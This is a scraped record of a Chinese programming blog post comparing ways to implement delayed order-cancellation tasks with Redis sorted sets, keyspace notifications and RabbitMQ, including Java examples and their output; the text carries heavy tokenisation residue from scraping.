,e,.,printStackTrace,(,),;,            ,},            ,System,.,out,.,println,(,i,+,\"秒过去了\",),;,            ,i,++,;,        ,},    ,},},\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t,\r\n\t\t,\r\n,\r\n,输出如下,\r\n\r\n\t\t,\r\n\t\t\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\n1秒过去了\r\n2秒过去了\r\n3秒过去了\r\n4秒过去了\r\n5秒过去了\r\n要去数据库删除订单了。。。。\r\n6秒过去了,\r\n\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,1,2,3,4,5,6,7,\r\n\t\t\t\t,\r\n\t\t\t\t\t\t,1,秒过去了,2,秒过去了,3,秒过去了,4,秒过去了,5,秒过去了,要去数据库删除订单了。。。。,6,秒过去了,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t,\r\n\t\t,\r\n,\r\n,\n,优缺点,\n,优点:效率高,任务触发时间延迟时间比delayQueue低，代码复杂度比delayQueue低。,\n缺点:(1)服务器重启后，数据全部消失，怕宕机,\n(2)集群扩展相当麻烦,\n(3)因为内存条件限制的原因，比如下单未付款的订单数太多，那么很容易就出现OOM异常,\n,(4)redis缓存,\n,思路一,\n,利用redis的zset,zset是一个有序集合，每一个元素(member)都关联了一个score,通过score排序来取集合中的值,\n,zset常用命令,\n添加元素:,ZADD key score member [[score member] [score member] …],\n按顺序查询元素:,ZRANGE key start stop [WITHSCORES],\n查询元素score:,ZSCORE key member,\n移除元素:,ZREM key member [member …],\n测试如下,\r\n\r\n\t\t,\r\n\t\t\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\n# 添加单个元素\r\n\r\nredis> ZADD page_rank 10 google.com\r\n(integer) 1\r\n\r\n\r\n# 添加多个元素\r\n\r\nredis> ZADD page_rank 9 baidu.com 8 bing.com\r\n(integer) 2\r\n\r\nredis> ZRANGE page_rank 0 -1 WITHSCORES\r\n1) \"bing.com\"\r\n2) \"8\"\r\n3) \"baidu.com\"\r\n4) \"9\"\r\n5) \"google.com\"\r\n6) \"10\"\r\n\r\n# 查询元素的score值\r\nredis> ZSCORE page_rank bing.com\r\n\"8\"\r\n\r\n# 移除单个元素\r\n\r\nredis> ZREM page_rank google.com\r\n(integer) 1\r\n\r\nredis> ZRANGE page_rank 0 -1 WITHSCORES\r\n1) \"bing.com\"\r\n2) \"8\"\r\n3) \"baidu.com\"\r\n4) \"9\",\r\n\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,\r\n\t\t\t\t,\r\n\t\t\t\t\t\t,# 添加单个元素, ,redis,>, ,ZADD ,page,_,rank, ,10, ,google,.,com,(,integer,), ,1, , ,# 添加多个元素, ,redis,>, ,ZADD ,page,_,rank, ,9, ,baidu,.,com, ,8, ,bing,.,com,(,integer,), ,2, ,redis,>, ,ZRANGE ,page,_,rank, ,0, ,-,1, ,WITHSCORES,1,), ,\"bing.com\",2,), ,\"8\",3,), ,\"baidu.com\",4,), ,\"9\",5,), ,\"google.com\",6,), ,\"10\", ,# 查询元素的score值,redis,>, ,ZSCORE ,page_rank ,bing,.,com,\"8\", ,# 移除单个元素, ,redis,>, ,ZREM ,page_rank ,google,.,com,(,integer,), ,1, ,redis,>, ,ZRANGE ,page,_,rank, ,0, ,-,1, ,WITHSCORES,1,), ,\"bing.com\",2,), ,\"8\",3,), ,\"baidu.com\",4,), ,\"9\",\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t,\r\n\t\t,\r\n,\r\n,那么如何实现呢？我们将订单超时时间戳与订单号分别设置为score和member,系统扫描第一个元素判断是否超时，具体如下图所示,\n,\n,实现一,\n,\r\n\r\n\t\t,\r\n\t\t\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\npackage com.rjzheng.delay4;\r\n\r\nimport java.util.Calendar;\r\nimport java.util.Set;\r\n\r\nimport redis.clients.jedis.Jedis;\r\nimport redis.clients.jedis.JedisPool;\r\nimport redis.clients.jedis.Tuple;\r\n\r\npublic class AppTest {\r\n    private static final String ADDR = \"127.0.0.1\";\r\n    private static final int PORT = 6379;\r\n    private static JedisPool jedisPool = new JedisPool(ADDR, PORT);\r\n    \r\n    public static Jedis getJedis() {\r\n       return jedisPool.getResource();\r\n    }\r\n    \r\n    //生产者,生成5个订单放进去\r\n    public void productionDelayMessage(){\r\n        for(int i=0;i<5;i++){\r\n            //延迟3秒\r\n            Calendar cal1 = Calendar.getInstance();\r\n            cal1.add(Calendar.SECOND, 3);\r\n            int second3later = (int) (cal1.getTimeInMillis() / 1000);\r\n            AppTest.getJedis().zadd(\"OrderId\", second3later,\"OID0000001\"+i);\r\n            System.out.println(System.currentTimeMillis()+\"ms:redis生成了一个订单任务：订单ID为\"+\"OID0000001\"+i);\r\n        }\r\n    }\r\n    \r\n    //消费者，取订单\r\n    public void consumerDelayMessage(){\r\n        Jedis jedis = AppTest.getJedis();\r\n        while(true){\r\n            Set<Tuple> items = jedis.zrangeWithScores(\"OrderId\", 0, 1);\r\n            if(items == null || items.isEmpty()){\r\n                System.out.println(\"当前没有等待的任务\");\r\n                try {\r\n                    Thread.sleep(500);\r\n                } catch (InterruptedException e) {\r\n                    // TODO Auto-generated catch block\r\n                    e.printStackTrace();\r\n                }\r\n                continue;\r\n            }\r\n            int  score = (int) ((Tuple)items.toArray()[0]).getScore();\r\n            Calendar cal = Calendar.getInstance();\r\n            int nowSecond = (int) (cal.getTimeInMillis() / 1000);\r\n            if(nowSecond >= score){\r\n                String orderId = ((Tuple)items.toArray()[0]).getElement();\r\n                jedis.zrem(\"OrderId\", orderId);\r\n                System.out.println(System.currentTimeMillis() +\"ms:redis消费了一个任务：消费的订单OrderId为\"+orderId);\r\n            }\r\n        }\r\n    }\r\n    \r\n    public static void main(String[] args) {\r\n        AppTest appTest =new AppTest();\r\n        appTest.productionDelayMessage();\r\n        appTest.consumerDelayMessage();\r\n    }\r\n    \r\n},\r\n\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61,62,63,\r\n\t\t\t\t,\r\n\t\t\t\t\t\t,package, ,com,.,rjzheng,.,delay4,;, ,import ,java,.,util,.,Calendar,;,import ,java,.,util,.,Set,;, ,import ,redis,.,clients,.,jedis,.,Jedis,;,import ,redis,.,clients,.,jedis,.,JedisPool,;,import ,redis,.,clients,.,jedis,.,Tuple,;, ,public, ,class, ,AppTest, ,{,    ,private, ,static, ,final, ,String, ,ADDR, ,=, ,\"127.0.0.1\",;,    ,private, ,static, ,final, ,int, ,PORT, ,=, ,6379,;,    ,private, ,static, ,JedisPool ,jedisPool, ,=, ,new, ,JedisPool,(,ADDR,,, ,PORT,),;,    ,    ,public, ,static, ,Jedis ,getJedis,(,), ,{,       ,return, ,jedisPool,.,getResource,(,),;,    ,},    ,    ,//生产者,生成5个订单放进去,    ,public, ,void, ,productionDelayMessage,(,),{,        ,for,(,int, ,i,=,0,;,i,<,5,;,i,++,),{,            ,//延迟3秒,            ,Calendar ,cal1, ,=, ,Calendar,.,getInstance,(,),;,            ,cal1,.,add,(,Calendar,.,SECOND,,, ,3,),;,            ,int, ,second3later, ,=, ,(,int,), ,(,cal1,.,getTimeInMillis,(,), ,/, ,1000,),;,            ,AppTest,.,getJedis,(,),.,zadd,(,\"OrderId\",,, ,second3later,,,\"OID0000001\",+,i,),;,            ,System,.,out,.,println,(,System,.,currentTimeMillis,(,),+,\"ms:redis生成了一个订单任务：订单ID为\",+,\"OID0000001\",+,i,),;,        ,},    ,},    ,    ,//消费者，取订单,    ,public, ,void, ,consumerDelayMessage,(,),{,        ,Jedis ,jedis, ,=, ,AppTest,.,getJedis,(,),;,        ,while,(,true,),{,            ,Set,<,Tuple,>, ,items, ,=, ,jedis,.,zrangeWithScores,(,\"OrderId\",,, ,0,,, ,1,),;,            ,if,(,items, ,==, ,null, ,||, ,items,.,isEmpty,(,),),{,                ,System,.,out,.,println,(,\"当前没有等待的任务\",),;,                ,try, ,{,                    ,Thread,.,sleep,(,500,),;,                ,}, ,catch, ,(,InterruptedException, ,e,), ,{,                    ,// TODO Auto-generated catch block,                    ,e,.,printStackTrace,(,),;,                ,},                ,continue,;,            ,},            ,int,  ,score, ,=, ,(,int,), ,(,(,Tuple,),items,.,toArray,(,),[,0,],),.,getScore,(,),;,            ,Calendar ,cal, ,=, ,Calendar,.,getInstance,(,),;,            ,int, ,nowSecond, ,=, ,(,int,), ,(,cal,.,getTimeInMillis,(,), ,/, ,1000,),;,            ,if,(,nowSecond, ,>=, ,score,),{,                ,String, ,orderId, ,=, ,(,(,Tuple,),items,.,toArray,(,),[,0,],),.,getElement,(,),;,                ,jedis,.,zrem,(,\"OrderId\",,, ,orderId,),;,                ,System,.,out,.,println,(,System,.,currentTimeMillis,(,), ,+,\"ms:redis消费了一个任务：消费的订单OrderId为\",+,orderId,),;,            ,},        ,},    ,},    ,    ,public, ,static, ,void, ,main,(,String,[,], ,args,), ,{,        ,AppTest ,appTest, ,=,new, ,AppTest,(,),;,        ,appTest,.,productionDelayMessage,(,),;,        ,appTest,.,consumerDelayMessage,(,),;,    ,},    ,},\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t,\r\n\t\t,\r\n,\r\n,此时对应输出如下,\r\n\r\n\t\t,\r\n\t\t\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\n1525086085261ms:redis生成了一个订单任务：订单ID为OID00000010\r\n1525086085263ms:redis生成了一个订单任务：订单ID为OID00000011\r\n1525086085266ms:redis生成了一个订单任务：订单ID为OID00000012\r\n1525086085268ms:redis生成了一个订单任务：订单ID为OID00000013\r\n1525086085270ms:redis生成了一个订单任务：订单ID为OID00000014\r\n1525086088000ms:redis消费了一个任务：消费的订单OrderId为OID00000010\r\n1525086088001ms:redis消费了一个任务：消费的订单OrderId为OID00000011\r\n1525086088002ms:redis消费了一个任务：消费的订单OrderId为OID00000012\r\n1525086088003ms:redis消费了一个任务：消费的订单OrderId为OID00000013\r\n1525086088004ms:redis消费了一个任务：消费的订单OrderId为OID00000014\r\n当前没有等待的任务\r\n当前没有等待的任务\r\n当前没有等待的任务,\r\n\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,1,2,3,4,5,6,7,8,9,10,11,12,13,\r\n\t\t\t\t,\r\n\t\t\t\t\t\t,1525086085261ms,:,redis,生成了一个订单任务：订单,ID,为,OID00000010,1525086085263ms,:,redis,生成了一个订单任务：订单,ID,为,OID00000011,1525086085266ms,:,redis,生成了一个订单任务：订单,ID,为,OID00000012,1525086085268ms,:,redis,生成了一个订单任务：订单,ID,为,OID00000013,1525086085270ms,:,redis,生成了一个订单任务：订单,ID,为,OID00000014,1525086088000ms,:,redis,消费了一个任务：消费的订单,OrderId,为,OID00000010,1525086088001ms,:,redis,消费了一个任务：消费的订单,OrderId,为,OID00000011,1525086088002ms,:,redis,消费了一个任务：消费的订单,OrderId,为,OID00000012,1525086088003ms,:,redis,消费了一个任务：消费的订单,OrderId,为,OID00000013,1525086088004ms,:,redis,消费了一个任务：消费的订单,OrderId,为,OID00000014,当前没有等待的任务,当前没有等待的任务,当前没有等待的任务,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t,\r\n\t\t,\r\n,\r\n,可以看到，几乎都是3秒之后，消费订单。,\n,然而，这一版存在一个致命的硬伤，在高并发条件下，多消费者会取到同一个订单号，我们上测试代码ThreadTest,\r\n\r\n\t\t,\r\n\t\t\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\npackage com.rjzheng.delay4;\r\n\r\nimport java.util.concurrent.CountDownLatch;\r\n\r\npublic class ThreadTest {\r\n    private static final int threadNum = 10;\r\n    private static CountDownLatch cdl = new CountDownLatch(threadNum);\r\n    static class DelayMessage implements Runnable{\r\n        public void run() {\r\n            try {\r\n                cdl.await();\r\n            } catch (InterruptedException e) {\r\n                // TODO Auto-generated catch block\r\n                e.printStackTrace();\r\n            }\r\n            AppTest appTest =new AppTest();\r\n            appTest.consumerDelayMessage();\r\n        }\r\n    }\r\n    public static void main(String[] args) {\r\n        AppTest appTest =new AppTest();\r\n        appTest.productionDelayMessage();\r\n        for(int i=0;i<threadNum;i++){\r\n            new Thread(new DelayMessage()).start();\r\n            cdl.countDown();\r\n        }\r\n    }\r\n},\r\n\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,\r\n\t\t\t\t,\r\n\t\t\t\t\t\t,package, ,com,.,rjzheng,.,delay4,;, ,import ,java,.,util,.,concurrent,.,CountDownLatch,;, ,public, ,class, ,ThreadTest, ,{,    ,private, ,static, ,final, ,int, ,threadNum, ,=, ,10,;,    ,private, ,static, ,CountDownLatch ,cdl, ,=, ,new, ,CountDownLatch,(,threadNum,),;,    ,static, ,class, ,DelayMessage, ,implements, ,Runnable,{,        ,public, ,void, ,run,(,), ,{,            ,try, ,{,                ,cdl,.,await,(,),;,            ,}, ,catch, ,(,InterruptedException, ,e,), ,{,                ,// TODO Auto-generated catch block,                ,e,.,printStackTrace,(,),;,            ,},            ,AppTest ,appTest, ,=,new, ,AppTest,(,),;,            ,appTest,.,consumerDelayMessage,(,),;,        ,},    ,},    ,public, ,static, ,void, ,main,(,String,[,], ,args,), ,{,        ,AppTest ,appTest, ,=,new, ,AppTest,(,),;,        ,appTest,.,productionDelayMessage,(,),;,        ,for,(,int, ,i,=,0,;,i,<,threadNum,;,i,++,),{,            ,new, ,Thread,(,new, ,DelayMessage,(,),),.,start,(,),;,            ,cdl,.,countDown,(,),;,        ,},    ,},},\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t,\r\n\t\t,\r\n,\r\n,输出如下所示,\r\n\r\n\t\t,\r\n\t\t\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\n1525087157727ms:redis生成了一个订单任务：订单ID为OID00000010\r\n1525087157734ms:redis生成了一个订单任务：订单ID为OID00000011\r\n1525087157738ms:redis生成了一个订单任务：订单ID为OID00000012\r\n1525087157747ms:redis生成了一个订单任务：订单ID为OID00000013\r\n1525087157753ms:redis生成了一个订单任务：订单ID为OID00000014\r\n1525087160009ms:redis消费了一个任务：消费的订单OrderId为OID00000010\r\n1525087160011ms:redis消费了一个任务：消费的订单OrderId为OID00000010\r\n1525087160012ms:redis消费了一个任务：消费的订单OrderId为OID00000010\r\n1525087160022ms:redis消费了一个任务：消费的订单OrderId为OID00000011\r\n1525087160023ms:redis消费了一个任务：消费的订单OrderId为OID00000011\r\n1525087160029ms:redis消费了一个任务：消费的订单OrderId为OID00000011\r\n1525087160038ms:redis消费了一个任务：消费的订单OrderId为OID00000012\r\n1525087160045ms:redis消费了一个任务：消费的订单OrderId为OID00000012\r\n1525087160048ms:redis消费了一个任务：消费的订单OrderId为OID00000012\r\n1525087160053ms:redis消费了一个任务：消费的订单OrderId为OID00000013\r\n1525087160064ms:redis消费了一个任务：消费的订单OrderId为OID00000013\r\n1525087160065ms:redis消费了一个任务：消费的订单OrderId为OID00000014\r\n1525087160069ms:redis消费了一个任务：消费的订单OrderId为OID00000014\r\n当前没有等待的任务\r\n当前没有等待的任务\r\n当前没有等待的任务\r\n当前没有等待的任务,\r\n\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,\r\n\t\t\t\t,\r\n\t\t\t\t\t\t,1525087157727ms,:,redis,生成了一个订单任务：订单,ID,为,OID00000010,1525087157734ms,:,redis,生成了一个订单任务：订单,ID,为,OID00000011,1525087157738ms,:,redis,生成了一个订单任务：订单,ID,为,OID00000012,1525087157747ms,:,redis,生成了一个订单任务：订单,ID,为,OID00000013,1525087157753ms,:,redis,生成了一个订单任务：订单,ID,为,OID00000014,1525087160009ms,:,redis,消费了一个任务：消费的订单,OrderId,为,OID00000010,1525087160011ms,:,redis,消费了一个任务：消费的订单,OrderId,为,OID00000010,1525087160012ms,:,redis,消费了一个任务：消费的订单,OrderId,为,OID00000010,1525087160022ms,:,redis,消费了一个任务：消费的订单,OrderId,为,OID00000011,1525087160023ms,:,redis,消费了一个任务：消费的订单,OrderId,为,OID00000011,1525087160029ms,:,redis,消费了一个任务：消费的订单,OrderId,为,OID00000011,1525087160038ms,:,redis,消费了一个任务：消费的订单,OrderId,为,OID00000012,1525087160045ms,:,redis,消费了一个任务：消费的订单,OrderId,为,OID00000012,1525087160048ms,:,redis,消费了一个任务：消费的订单,OrderId,为,OID00000012,1525087160053ms,:,redis,消费了一个任务：消费的订单,OrderId,为,OID00000013,1525087160064ms,:,redis,消费了一个任务：消费的订单,OrderId,为,OID00000013,1525087160065ms,:,redis,消费了一个任务：消费的订单,OrderId,为,OID00000014,1525087160069ms,:,redis,消费了一个任务：消费的订单,OrderId,为,OID00000014,当前没有等待的任务,当前没有等待的任务,当前没有等待的任务,当前没有等待的任务,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t,\r\n\t\t,\r\n,\r\n,显然，出现了多个线程消费同一个资源的情况。,\n,解决方案,\n,(1)用分布式锁，但是用分布式锁，性能下降了，该方案不细说。,\n(2)对ZREM的返回值进行判断，只有大于0的时候，才消费数据，于是将consumerDelayMessage()方法里的,\r\n\r\n\t\t,\r\n\t\t\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\nif(nowSecond >= score){\r\n    String orderId = ((Tuple)items.toArray()[0]).getElement();\r\n    jedis.zrem(\"OrderId\", orderId);\r\n    System.out.println(System.currentTimeMillis()+\"ms:redis消费了一个任务：消费的订单OrderId为\"+orderId);\r\n},\r\n\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,1,2,3,4,5,\r\n\t\t\t\t,\r\n\t\t\t\t\t\t,if,(,nowSecond, ,>=, ,score,),{,    ,String, ,orderId, ,=, ,(,(,Tuple,),items,.,toArray,(,),[,0,],),.,getElement,(,),;,    ,jedis,.,zrem,(,\"OrderId\",,, ,orderId,),;,    ,System,.,out,.,println,(,System,.,currentTimeMillis,(,),+,\"ms:redis消费了一个任务：消费的订单OrderId为\",+,orderId,),;,},\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t,\r\n\t\t,\r\n,\r\n,修改为,\r\n\r\n\t\t,\r\n\t\t\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\nif(nowSecond >= score){\r\n    String orderId = ((Tuple)items.toArray()[0]).getElement();\r\n    Long num = jedis.zrem(\"OrderId\", orderId);\r\n    if( num != null && num>0){\r\n        System.out.println(System.currentTimeMillis()+\"ms:redis消费了一个任务：消费的订单OrderId为\"+orderId);\r\n    }\r\n},\r\n\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,1,2,3,4,5,6,7,\r\n\t\t\t\t,\r\n\t\t\t\t\t\t,if,(,nowSecond, ,>=, ,score,),{,    ,String, ,orderId, ,=, ,(,(,Tuple,),items,.,toArray,(,),[,0,],),.,getElement,(,),;,    ,Long, ,num, ,=, ,jedis,.,zrem,(,\"OrderId\",,, ,orderId,),;,    ,if,(, ,num, ,!=, ,null, ,&&, ,num,>,0,),{,        ,System,.,out,.,println,(,System,.,currentTimeMillis,(,),+,\"ms:redis消费了一个任务：消费的订单OrderId为\",+,orderId,),;,    ,},},\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t,\r\n\t\t,\r\n,\r\n,在这种修改后，重新运行ThreadTest类，发现输出正常了,\n,思路二,\n,该方案使用redis的Keyspace Notifications，中文翻译就是,键空间机制,，就是利用该机制可以在key失效之后，提供一个回调，实际上是redis会给客户端发送一个消息。是需要redis版本2.8以上。,\n,实现二,\n,在redis.conf中，加入一条配置,\r\n\r\n\t\t,\r\n\t\t\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\nnotify-keyspace-events Ex,\r\n\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,1,\r\n\t\t\t\t,\r\n\t\t\t\t\t\t,notify,-,keyspace,-,events ,Ex,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t,\r\n\t\t,\r\n,\r\n,运行代码如下,\r\n\r\n\t\t,\r\n\t\t\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\npackage com.rjzheng.delay5;\r\n\r\nimport redis.clients.jedis.Jedis;\r\nimport redis.clients.jedis.JedisPool;\r\nimport redis.clients.jedis.JedisPubSub;\r\n\r\npublic class RedisTest {\r\n    private static final String ADDR = \"127.0.0.1\";\r\n    private static final int PORT = 6379;\r\n    private static JedisPool jedis = new JedisPool(ADDR, PORT);\r\n    private static RedisSub sub = new RedisSub();\r\n\r\n    public static void init() {\r\n        new Thread(new Runnable() {\r\n            public void run() {\r\n                jedis.getResource().subscribe(sub, \"__keyevent@0__:expired\");\r\n            }\r\n        }).start();\r\n    }\r\n\r\n    public static void main(String[] args) throws InterruptedException {\r\n        init();\r\n        for(int i =0;i<10;i++){\r\n            String orderId = \"OID000000\"+i;\r\n            jedis.getResource().setex(orderId, 3, orderId);\r\n            System.out.println(System.currentTimeMillis()+\"ms:\"+orderId+\"订单生成\");\r\n        }\r\n    }\r\n    \r\n    static class RedisSub extends JedisPubSub {\r\n        <a href='http://www.jobbole.com/members/wx610506454'>@Override</a>\r\n        public void onMessage(String channel, String message) {\r\n            System.out.println(System.currentTimeMillis()+\"ms:\"+message+\"订单取消\");\r\n        }\r\n    }\r\n},\r\n\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,\r\n\t\t\t\t,\r\n\t\t\t\t\t\t,package, ,com,.,rjzheng,.,delay5,;, ,import ,redis,.,clients,.,jedis,.,Jedis,;,import ,redis,.,clients,.,jedis,.,JedisPool,;,import ,redis,.,clients,.,jedis,.,JedisPubSub,;, ,public, ,class, ,RedisTest, ,{,    ,private, ,static, ,final, ,String, ,ADDR, ,=, ,\"127.0.0.1\",;,    ,private, ,static, ,final, ,int, ,PORT, ,=, ,6379,;,    ,private, ,static, ,JedisPool ,jedis, ,=, ,new, ,JedisPool,(,ADDR,,, ,PORT,),;,    ,private, ,static, ,RedisSub ,sub, ,=, ,new, ,RedisSub,(,),;, ,    ,public, ,static, ,void, ,init,(,), ,{,        ,new, ,Thread,(,new, ,Runnable,(,), ,{,            ,public, ,void, ,run,(,), ,{,                ,jedis,.,getResource,(,),.,subscribe,(,sub,,, ,\"__keyevent@0__:expired\",),;,            ,},        ,},),.,start,(,),;,    ,}, ,    ,public, ,static, ,void, ,main,(,String,[,], ,args,), ,throws, ,InterruptedException, ,{,        ,init,(,),;,        ,for,(,int, ,i, ,=,0,;,i,<,10,;,i,++,),{,            ,String, ,orderId, ,=, ,\"OID000000\",+,i,;,            ,jedis,.,getResource,(,),.,setex,(,orderId,,, ,3,,, ,orderId,),;,            ,System,.,out,.,println,(,System,.,currentTimeMillis,(,),+,\"ms:\",+,orderId,+,\"订单生成\",),;,        ,},    ,},    ,    ,static, ,class, ,RedisSub, ,extends, ,JedisPubSub, ,{,        ,<,a, ,href,=,'http://www.jobbole.com/members/wx610506454',>,@,Override,<,/,a,>,        ,public, ,void, ,onMessage,(,String, ,channel,,, ,String, ,message,), ,{,            ,System,.,out,.,println,(,System,.,currentTimeMillis,(,),+,\"ms:\",+,message,+,\"订单取消\",),;,        ,},    ,},},\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t,\r\n\t\t,\r\n,\r\n,输出如下,\r\n\r\n\t\t,\r\n\t\t\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\n1525096202813ms:OID0000000订单生成\r\n1525096202818ms:OID0000001订单生成\r\n1525096202824ms:OID0000002订单生成\r\n1525096202826ms:OID0000003订单生成\r\n1525096202830ms:OID0000004订单生成\r\n1525096202834ms:OID0000005订单生成\r\n1525096202839ms:OID0000006订单生成\r\n1525096205819ms:OID0000000订单取消\r\n1525096205920ms:OID0000005订单取消\r\n1525096205920ms:OID0000004订单取消\r\n1525096205920ms:OID0000001订单取消\r\n1525096205920ms:OID0000003订单取消\r\n1525096205920ms:OID0000006订单取消\r\n1525096205920ms:OID0000002订单取消,\r\n\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,1,2,3,4,5,6,7,8,9,10,11,12,13,14,\r\n\t\t\t\t,\r\n\t\t\t\t\t\t,1525096202813ms,:,OID0000000,订单生成,1525096202818ms,:,OID0000001,订单生成,1525096202824ms,:,OID0000002,订单生成,1525096202826ms,:,OID0000003,订单生成,1525096202830ms,:,OID0000004,订单生成,1525096202834ms,:,OID0000005,订单生成,1525096202839ms,:,OID0000006,订单生成,1525096205819ms,:,OID0000000,订单取消,1525096205920ms,:,OID0000005,订单取消,1525096205920ms,:,OID0000004,订单取消,1525096205920ms,:,OID0000001,订单取消,1525096205920ms,:,OID0000003,订单取消,1525096205920ms,:,OID0000006,订单取消,1525096205920ms,:,OID0000002,订单取消,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t,\r\n\t\t,\r\n,\r\n,可以明显看到3秒过后，订单取消了,\nps:redis的,pub/sub,机制存在一个硬伤，官网内容如下,\n,原,:Because Redis Pub/Sub is fire and forget currently there is no way to use this feature if your application demands reliable notification of events, that is, if your Pub/Sub client disconnects, and reconnects later, all the events delivered during the time the client was disconnected are lost.,\n,翻,: Redis的发布/订阅目前是即发即弃(fire and forget)模式的，因此无法实现事件的可靠通知。也就是说，如果发布/订阅的客户端断链之后又重连，则在客户端断链期间的所有事件都丢失了。,\n因此，方案二不是太推荐。当然，如果你对可靠性要求不高，可以使用。,\n,优缺点,\n,优点:(1)由于使用Redis作为消息通道，消息都存储在Redis中。如果发送程序或者任务处理程序挂了，重启之后，还有重新处理数据的可能性。,\n(2)做集群扩展相当方便,\n(3)时间准确度高,\n缺点:(1)需要额外进行redis维护,\n,(5)使用消息队列,\n,我们可以采用rabbitMQ的延时队列。RabbitMQ具有以下两个特性，可以实现延迟队列,\n,\n,RabbitMQ可以针对Queue和Message设置 x-message-tt，来控制消息的生存时间，如果超时，则消息变为dead letter,\n,lRabbitMQ的Queue可以配置x-dead-letter-exchange 和x-dead-letter-routing-key（可选）两个参数，用来控制队列内出现了deadletter，则按照这两个参数重新路由。,\n结合以上两个特性，就可以模拟出延迟消息的功能,具体的，我改天再写一篇文章，这里再讲下去，篇幅太长。,\n,\n,优缺点,\n,优点: 高效,可以利用rabbitmq的分布式特性轻易的进行横向扩展,消息支持持久化增加了可靠性。,\n缺点：本身的易用度要依赖于rabbitMq的运维.因为要引用rabbitMq,所以复杂度和成本变高,\n,总结,\n,本文总结了目前互联网中，绝大部分的延时任务的实现方案。希望大家在工作中能够有所收获。,\n其实大家在工作中，百分九十的人还是以业务逻辑为主，很少有机会能够进行方案设计。所以博主不推荐在分布式这块，花太多时间，应该看看《,手把手系列的文章,》。不过，鉴于现在的面试造火箭，工作拧螺丝现象太过严重，所以博主开始写《,分布式系列,》，最后来个小漫画娱乐一下。,\n,\n\r\n        \r\n        \r\n        \n    ,\n        , ,2, 赞,\n        , 5 收藏,\n\n                    ,  评论,\n        \n        \n        \n        ,\n        ,\n            ,\n            ,\n            ,\n            ,\n            ,\n        ,\n\n    ,\n\n\n\n\r\n        ,\r\n\r\n\r\n,\r\n\t", "url": "http://blog.jobbole.com/114009/", "url_object_id": "9d318dfaa9e2e87c3a9c89f18682922d", "front_image_path": "full/117976068e2e847f1067d25ea3fa90a3b5a60f3f.jpg"},{"front_image_url": ["http://jbcdn2.b0.upaiyun.com/2018/06/98df4795d7c7f65c7ec89ddf1a1afd92.jpg"], "title": "倾听程序员的心声真的很重要", "create_time": "2018/06/05", "vote": "1", "bookmark": "2", "comments": "1", "content": "\r\n\r\n        \t\t\t,\n\t\t\r\n\t\t,原文出处： ,Miranda Casey,   译文出处：,码农网 – 小峰,   ,\n,说到开发产品，没有人比程序员更了解产品。程序员知道产品的优点、缺陷、用途和潜在用途。说起这些，程序员了如指掌，如数家珍。,\n,在这个似乎无所不在的数字时代，倾听程序员必须要说的内容非常重要，而且也许比以往任何时期都更加重要。,\n,\n,计算机和网络行业日渐变得更加软件驱动。同时，物联网（IoT）产业正在迅速占领市场。Gartner 预测，到 2020 年，全球将有超过 208 